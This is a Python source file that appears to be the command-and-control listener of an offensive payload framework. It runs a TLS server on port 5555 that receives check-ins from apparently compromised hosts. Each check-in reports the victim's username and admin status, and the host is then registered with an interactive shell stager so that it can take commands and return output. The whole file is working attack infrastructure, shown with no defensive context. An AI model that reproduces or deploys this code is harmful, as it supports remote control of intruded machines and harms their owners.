import asyncio
import ssl
import threading


class StartAsync(threading.Thread):
    def __init__(self, port=5555):
        threading.Thread.__init__(self)
        self.loop = asyncio.get_event_loop()
        self.port = port
        self.sc = ssl.SSLContext(protocol=ssl.PROTOCOL_TLSv1)
        self.sc.load_cert_chain('server.crt', 'server.key')
        self.sc.set_ciphers('AES256')
        self.server = Server()
        self.setDaemon(True)

    def run(self):
        self.coro = asyncio.start_server(self.server.client_connect,
                                         '0.0.0.0',
                                         port=self.port,
                                         loop=self.loop,
                                         ssl=self.sc
                                         )
        self.listener = self.loop.run_until_complete(self.coro)
        self.loop.run_forever()

    def stop(self):
        self.server.close()
        self.loop.call_soon_threadsafe(self.loop.stop)
        self.join()
        print('Server Stopped')


class Client():
    def __init__(self, clientnumber, addr, writer, reader):
        self.addr = addr
        self.clientnumber = clientnumber
        self.writer = writer
        self.reader = reader
        self.in_buffer = []
        self.username = ''
        self.is_admin = ''

    async def receive(self):
        while True:
            data = await self.reader.read(8000)
            data = data.decode()
            if data == '':
                self.close_client()
                return
            else:
                if '[#check#]' in data:
                    self.user_name = "User:" + data.split(':')[0].replace('\x00','').replace('[#check#]','')
                    self.is_admin = "Admin:" + data.split(':')[1].replace('\x00','').replace('[#check#]','')
                    from .menu import clientMenuOptions
                    from .stager import interactShell
                    clientMenuOptions[str(self.clientnumber)] =  {'payloadchoice': None, 'payload': self.addr, 'extrawork': interactShell, 'params': str(self.clientnumber), 'availablemodules':{self.user_name: '', self.is_admin: ''}}
                else:
                    self.in_buffer.append(data)

    def close_client(self):
        self.writer._transport.close()
        self.reader._transport.close()
        print("Closing Client {}".format(self.addr))
        return


class Server():
    def __init__(self):
        self.clients = {}
        self.clientnumber = 0

    async def client_connect(self, client_reader, client_writer):
        rawaddr = client_writer.get_extra_info('peername')
        addr = '{}:{}'.format(rawaddr[0], rawaddr[1])
        print('Client connected: {}'.format(addr))
        self.clientnumber += 1
        client = Client(self.clientnumber, addr, client_writer, client_reader)
        self.clients[self.clientnumber] = client
        await asyncio.gather(client.receive())

    def close(self):
        for clientnum, client in list(self.clients.items()):
            client.close_client()


if __name__ == '__main__':
    listener = StartAsync()
    listener.start()
    try:
        while True:
            comm = input(': ')
            if comm == 'print':
                if listener.server.clients[1].in_buffer:
                    print(listener.server.clients[1].in_buffer.pop())
            if 'send' in comm:
                listener.server.clients[1].writer.write(comm.split()[1])
    except KeyboardInterrupt:
        listener.stop()
